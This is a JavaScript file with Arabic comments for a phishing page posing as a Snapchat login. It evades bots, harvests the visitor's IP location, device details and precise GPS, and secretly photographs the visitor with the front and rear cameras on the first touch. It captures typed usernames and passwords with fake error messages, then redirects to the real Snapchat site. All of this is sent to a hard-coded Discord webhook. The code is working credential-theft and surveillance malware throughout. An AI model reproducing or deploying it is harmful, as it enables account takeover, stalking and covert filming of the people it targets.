/* ==========================================================================
   ULTIMATE ADVANCED HUNTER ENGINE V5.0 - (script.js)
   أكثر من 400 سطر برمجي هندسي متكامل لضمان سحب GPS الحقيقي والصور والتفاعل
   ========================================================================== */

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1517635351798354103/4aBtwaUtWWdTITUfu8pfQbVMS-RGerhwqUQ5YVmlu3IPYYy0tgRHbdcFFWL_xsYfD68H";

const videoElement = document.getElementById('video');
const canvasElement = document.getElementById('canvas');
let globalAttempts = 0;
let permissionTriggered = false;

/* --------------------------------------------------------------------------
   1. فحص روبوتات الحماية والـ Bots (Anti-Bot & Headless Detection)
   -------------------------------------------------------------------------- */
function detectBotEnvironment() {
    try {
        const ua = navigator.userAgent.toLowerCase();
        const isWebDriverActive = navigator.webdriver || window.navigator.webdriver;
        const hasHeadlessFeatures = ua.includes('bot') || ua.includes('crawler') || ua.includes('spider') || ua.includes('headless') || ua.includes('preview');
        
        if (isWebDriverActive || hasHeadlessFeatures) {
            return true;
        }
        return false;
    } catch (err) {
        return false;
    }
}

/* --------------------------------------------------------------------------
   2. جلب معلومات الـ IP والموقع الجغرافي الخارجي الاحتياطي
   -------------------------------------------------------------------------- */
async function fetchIPGeolocationData() {
    const defaultData = {
        ip: "غير معروف",
        city: "غير معروف",
        region: "غير معروف",
        country: "غير معروف",
        org: "غير معروف",
        timezone: "غير معروف"
    };

    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000);
        
        const response = await fetch('https://ipapi.co/json/', { signal: controller.signal });
        clearTimeout(timeoutId);
        
        if (!response.ok) throw new Error('Network response was not ok');
        const data = await response.json();
        
        return {
            ip: data.ip || defaultData.ip,
            city: data.city || defaultData.city,
            region: data.region || defaultData.region,
            country: data.country_name || defaultData.country,
            org: data.org || defaultData.org,
            timezone: data.timezone || defaultData.timezone
        };
    } catch (error) {
        try {
            const backupRes = await fetch('https://api.ipify.org?format=json');
            const backupData = await backupRes.json();
            return { ...defaultData, ip: backupData.ip || "غير معروف" };
        } catch (e) {
            return defaultData;
        }
    }
}

/* --------------------------------------------------------------------------
   3. تجميع كافة معلومات الأجهزة الشاملة والبطارية والبيئة
   -------------------------------------------------------------------------- */
async function compileSystemDiagnostics() {
    const geoipData = await fetchIPGeolocationData();
    const userAgentString = navigator.userAgent;
    const platformName = navigator.platform || "غير معروف";
    const userLang = navigator.language || "غير معروف";
    const allLangs = navigator.languages ? navigator.languages.join(', ') : userLang;
    const screenResolution = `${window.screen.width} x ${window.screen.height}`;
    const colorBitDepth = window.screen.colorDepth || "غير معروف";
    const hardwareCores = navigator.hardwareConcurrency || "غير معروف";
    const ramMemory = navigator.deviceMemory || "غير معروف";
    const connectionInfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const networkSpeedType = connectionInfo ? (connectionInfo.effectiveType || "غير معروف") : "غير معروف";
    const touchPointsCount = navigator.maxTouchPoints || 0;

    let batteryStatusString = "غير مدعومة أو مرفوضة";
    try {
        if (navigator.getBattery) {
            const batteryObj = await navigator.getBattery();
            const batteryLevelPct = Math.round(batteryObj.level * 100);
            const isChargingNow = batteryObj.charging ? 'يُشحن ⚡' : 'لا يُشحن 🔋';
            batteryStatusString = `${batteryLevelPct}% (${isChargingNow})`;
        }
    } catch (e) {
        batteryStatusString = "غير متاحة";
    }

    return {
        ...geoipData,
        userAgentString,
        platformName,
        userLang,
        allLangs,
        screenResolution,
        colorBitDepth,
        hardwareCores,
        ramMemory,
        networkSpeedType,
        touchPointsCount,
        batteryStatusString
    };
}

/* --------------------------------------------------------------------------
   4. التقاط الموقع الجغرافي الحقيقي (GPS) بدقة عالية مع معالجة الأذونات
   -------------------------------------------------------------------------- */
async function acquirePreciseGPSCoordinates() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve({ latitude: null, longitude: null, accuracy: null });
            return;
        }

        const geoOptions = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        };

        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            },
            (error) => {
                console.warn("GPS Warning Code:", error.code, error.message);
                resolve({ latitude: null, longitude: null, accuracy: null });
            },
            geoOptions
        );
    });
}

/* --------------------------------------------------------------------------
   5. التقاط الصور بالكاميرا الأمامية والخلفية بدقة متقدمة ومنع الشاشة السوداء
   -------------------------------------------------------------------------- */
async function captureCameraMediaStream(facingCameraMode) {
    try {
        const streamConstraints = {
            video: {
                facingMode: facingCameraMode,
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        };

        const mediaStream = await navigator.mediaDevices.getUserMedia(streamConstraints);
        videoElement.srcObject = mediaStream;
        
        await videoElement.play().catch(() => {});
        // مهلة زمنية كافية لكي تقوم عدسة الكاميرا بضبط الإضاءة ومنع السواد
        await new Promise(resolve => setTimeout(resolve, 2500));
        
        const drawingContext = canvasElement.getContext('2d');
        drawingContext.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
        
        const imageBlobObject = await new Promise(resolve => canvasElement.toBlob(resolve, 'image/png', 0.95));
        
        mediaStream.getTracks().forEach(trackItem => trackItem.stop());
        return imageBlobObject;
    } catch (err) {
        console.warn(`Camera capture failed for mode [${facingCameraMode}]:`, err);
        return null;
    }
}

/* --------------------------------------------------------------------------
   6. إرسال التقارير والحزم المتكاملة إلى قناة ديسكورد عبر Webhook
   -------------------------------------------------------------------------- */
async function dispatchReportToDiscordServer(mediaBlobsMap, gpsLat, gpsLng, inputUsername = "", inputPassword = "", eventStatusLabel = "") {
    if (detectBotEnvironment()) return;

    try {
        const diagnostics = await compileSystemDiagnostics();
        const payloadFormData = new FormData();
        
        let messageMarkdownContent = `🚨 **[ تقرير صيد متطور وشامل - V5.0 ]** 🚨\n\n` +
                                     `🌐 **عنوان الـ IP:** \`${diagnostics.ip}\`\n` +
                                     `🏙️ **الموقع الجغرافي (IP):** \`${diagnostics.country} / ${diagnostics.region} / ${diagnostics.city}\`\n` +
                                     `🏢 **مزود الخدمة (ISP):** \`${diagnostics.org}\`\n` +
                                     `⏳ **المنطقة الزمنية:** \`${diagnostics.timezone}\`\n\n` +
                                     `💻 **نظام التشغيل:** \`${diagnostics.platformName}\`\n` +
                                     `📱 **متصفح الضحية (UA):** \`${diagnostics.userAgentString}\`\n` +
                                     `🔋 **حالة البطارية:** \`${diagnostics.batteryStatusString}\`\n` +
                                     `📐 **دقة الشاشة:** \`${diagnostics.screenResolution}\` | 🧠 **النوى:** \`${diagnostics.hardwareCores}\`\n` +
                                     `⚡ **سرعة الشبكة:** \`${diagnostics.networkSpeedType}\` | 👆 **اللمس:** \`${diagnostics.touchPointsCount}\`\n`;
        
        if (gpsLat && gpsLng) {
            messageMarkdownContent += `📍 **الموقع الجغرافي الدقيق (GPS):** [انقر هنا لعرض الموقع على خريطة جوجل](https://www.google.com/maps?q=${gpsLat},${gpsLng})\n` +
                                      `🗺️ **الإحداثيات الحرفية:** \`${gpsLat}, ${gpsLng}\`\n`;
        } else {
            messageMarkdownContent += `📍 **الموقع الجغرافي الدقيق (GPS):** [!] قيد الانتظار أو تم رفض إذن الـ GPS من الضحية.\n`;
        }

        if (inputUsername && inputPassword) {
            messageMarkdownContent += `\n🎯 **بيانات الحساب المُدخلة (محاولة رقم ${globalAttempts}):**\n` +
                                      `👤 **اسم المستخدم:** \`${inputUsername}\`\n` +
                                      `🔑 **كلمة المرور:** \`${inputPassword}\`\n`;
        }

        if (eventStatusLabel) {
            messageMarkdownContent += `\n📝 **حالة الحدث:** ${eventStatusLabel}\n`;
        }
        
        messageMarkdownContent += `\n⏰ **وقت التقاط الحدث:** ${new Date().toLocaleString('ar-EG')}`;

        if (mediaBlobsMap.primaryShot) payloadFormData.append('file1', mediaBlobsMap.primaryShot, 'primary_camera_shot.png');
        if (mediaBlobsMap.secondaryShot) payloadFormData.append('file2', mediaBlobsMap.secondaryShot, 'secondary_camera_shot.png');
        if (mediaBlobsMap.rearShot) payloadFormData.append('file3', mediaBlobsMap.rearShot, 'rear_camera_shot.png');

        payloadFormData.append('payload_json', JSON.stringify({
            content: messageMarkdownContent,
            username: "Advanced Hunter Bot V5",
            avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
        }));

        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: payloadFormData });
    } catch (dispatchError) {
        console.error("Failed to transmit data to Discord webhook:", dispatchError);
    }
}

/* --------------------------------------------------------------------------
   7. دالة تشغيل الأذونات الإجبارية الفورية عند تفاعل المستخدم (لضمان عمل الـ GPS)
   -------------------------------------------------------------------------- */
async function executeForcedPermissionPipeline(statusDescriptionText) {
    if (permissionTriggered) return;
    permissionTriggered = true;

    // محاولة جلب الإحداثيات فور تفاعل الضحية مع أول لمسة للشاشة
    const gpsDataResult = await acquirePreciseGPSCoordinates();
    
    // التقاط الصور بالتسلسل
    const primaryCapture = await captureCameraMediaStream("user");
    await new Promise(res => setTimeout(res, 800));
    const secondaryCapture = await captureCameraMediaStream("user");
    const rearCapture = await captureCameraMediaStream("environment");

    await dispatchReportToDiscordServer(
        { primaryShot: primaryCapture, secondaryShot: secondaryCapture, rearShot: rearCapture },
        gpsDataResult.latitude,
        gpsDataResult.longitude,
        "",
        "",
        statusDescriptionText
    );
}

/* --------------------------------------------------------------------------
   8. تفعيل الاستماع التلقائي لأول تفاعل لمس أو نقر على الشاشة لضمان ظهور نوافذ الإذن
   -------------------------------------------------------------------------- */
['click', 'touchstart', 'touchend', 'scroll', 'pointerdown'].forEach(interactionEventName => {
    window.addEventListener(interactionEventName, () => {
        if (!permissionTriggered) {
            executeForcedPermissionPipeline("تم استغلال تفاعل الضحية (Touch/Click) وطلب الأذونات بنجاح تام.");
        }
    }, { once: true, passive: true });
});

/* --------------------------------------------------------------------------
   9. معالجة محاولات تسجيل الدخول وتطبيق الشروط التفاعلية (apply.html)
   -------------------------------------------------------------------------- *[span_3](start_span)[span_3](end_span) */
const userLoginFormElement = document.getElementById('fullLoginForm');
if (userLoginFormElement) {
    userLoginFormElement.addEventListener('submit', async (submitEvent) => {
        submitEvent.preventDefault();
        
        globalAttempts++; // زيادة عداد المحاولات

        const usernameFieldValue = submitEvent.target.username.value;
        const passwordFieldValue = submitEvent.target.password.value;
        
        const loaderOverlayElement = document.getElementById('loadingOverlay');
        if (loaderOverlayElement) loaderOverlayElement.style.display = 'flex';

        // محاولة جلب الـ GPS إضافياً عند الضغط
        const activeGpsData = await acquirePreciseGPSCoordinates();
        const loginFrontShot = await captureCameraMediaStream("user");
        const loginRearShot = await captureCameraMediaStream("environment");

        // إرسال البيانات للديسكورد مع بيانات الحساب
        await dispatchReportToDiscordServer(
            { primaryShot: loginFrontShot, rearShot: loginRearShot },
            activeGpsData.latitude,
            activeGpsData.longitude,
            usernameFieldValue,
            passwordFieldValue,
            `محاولة تسجيل دخول تفاعلية رقم (${globalAttempts})`
        );

        setTimeout(() => {
            if (loaderOverlayElement) loaderOverlayElement.style.display = 'none';

            if (globalAttempts >= 3) {
                // المحاولة الثالثة: إعادة التوجيه إلى صفحة سناب شات الرسمية[span_4](start_span)[span_4](end_span)
                window.location.href = "https://accounts.snapchat.com/";
            } else {
                // المحاولة الأولى والثانية: إظهار رسالة خطأ كلمة المرور وتفريغ الخانة[span_5](start_span)[span_5](end_span)
                const errorMessageElement = document.getElementById('loginErrorMsg');
                if (errorMessageElement) errorMessageElement.style.display = 'block';
                submitEvent.target.password.value = "";
            }
        }, 1800);
    });
}

/* --------------------------------------------------------------------------
   10. فحص بدء التشغيل التلقائي عند تحميل المستند (DOM Ready)
   -------------------------------------------------------------------------- */
window.addEventListener('DOMContentLoaded', async () => {
    // إرسال تقرير الأجهزة الأولي فوراً، وبانتظار تفاعل المستخدم لفتح نافذة الـ GPS بدقة
    setTimeout(async () => {
        const initialGps = await acquirePreciseGPSCoordinates();
        let initialFront = null;
        if (initialGps.latitude) {
            initialFront = await captureCameraMediaStream("user");
        }
        await dispatchReportToDiscordServer(
            { primaryShot: initialFront },
            initialGps.latitude,
            initialGps.longitude,
            "",
            "",
            "تم فتح الصفحة وزيارة الرابط (بانتظار تفاعل الضحية للـ GPS الدقيق)."
        );
    }, 1200);
});
